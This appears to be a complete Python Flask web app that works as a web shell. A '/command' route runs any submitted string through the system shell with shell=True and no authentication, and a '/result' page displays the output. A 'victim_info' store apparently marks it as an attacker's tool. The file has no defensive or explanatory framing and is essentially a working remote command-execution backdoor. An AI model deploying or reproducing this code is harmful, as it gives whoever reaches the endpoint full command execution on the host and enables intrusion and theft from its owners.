import flask
from flask import *

app = Flask(__name__)
app.config['TEMPLATES_AUTO_RELOAD'] = True 


victim_info = {}

@app.route("/command", methods=['GET', 'POST'])
def command():
    if request.method == 'POST':
        cmd = request.form.get('cmd')
        if cmd:
           
            result = execute_command(cmd)
            
            return redirect(url_for('show_result', result=result))
    return render_template('command.html')

@app.route("/result", methods=['GET'])
def show_result():
   
    result = request.args.get('result')
    return render_template('result.html', result=result)

def execute_command(cmd):
    try:
       
        import subprocess
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return result
    except Exception as e:
        return str(e)

def get_victim_info():
   
    return victim_info

if __name__ == '__main__':
    app.run(debug=True)
